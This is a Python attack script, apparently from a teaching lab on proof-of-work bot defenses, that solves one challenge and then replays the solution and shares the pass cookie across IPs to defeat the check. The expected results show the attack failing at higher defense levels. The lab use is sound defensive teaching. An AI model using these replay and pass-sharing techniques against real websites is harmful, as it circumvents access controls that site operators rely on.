"""
Chapter 7 — Round 2 Attack: pay once, use forever

Objective: play fair exactly once. Solve the server's (signed) challenge
honestly on one core, then reuse what it buys:

  1. reuse the pass cookie for every page;
  2. when the pass stops working, redeem the *same* solution again to mint
     a fresh pass, instead of solving a new challenge.

Chapter 5 warned about this: "solve once, replay a million times".

Expected results:
  - DEFENSE_LEVEL<=2    → 200/200 for one solve (~65k hashes, a fraction of a CPU-second)
  - DEFENSE_LEVEL>=3    → 20/200: the pass budget runs out, and the replayed
                          solution is refused ("challenge already redeemed")

With --share the bot also hands its pass to a second IP (a pass-sharing
farm). At level 3 that fails: "PoW pass is bound to another client".

Run:
    python attacks/round2_solve_once_replay.py [--share]
"""

import os
import sys

sys.path.insert(0, os.path.dirname(__file__))
from _common import (PAGES, Tally, client, get_challenge, redeem, report,  # noqa: E402
                     scrape, solve_here)


def run(share=False):
    """Run the attack; return its scoreboard row (used by tools/checkpoint.py)."""
    tally = Tally("round2_solve_once_replay")
    saved = {}
    with client() as c:
        def pass_once_then_replay():
            if not saved:
                challenge = get_challenge(c)
                if challenge is None:
                    return False
                saved["challenge"], saved["counter"] = challenge, solve_here(challenge, tally)
            else:
                tally.note("replaying the same solution for a new pass")
            ok, why = redeem(c, saved["challenge"], saved["counter"])
            if not ok:
                tally.note(f"verify refused: {why}")
            return ok

        if not share:
            scrape(c, tally, range(1, PAGES + 1), get_pass=pass_once_then_replay)
            return tally.result()

        # --share: earn a pass on 203.0.113.66, spend it from 203.0.113.67
        scrape(c, tally, [1], get_pass=pass_once_then_replay)
        with client("203.0.113.67") as other:
            other.cookies.update(c.cookies)
            scrape(other, tally, range(2, PAGES + 1), get_pass=lambda: False)
    return tally.result()


if __name__ == "__main__":
    share = "--share" in sys.argv
    print(f"=== Round 2: solve once, replay{' + share the pass' if share else ''} ===")
    report(run(share=share))
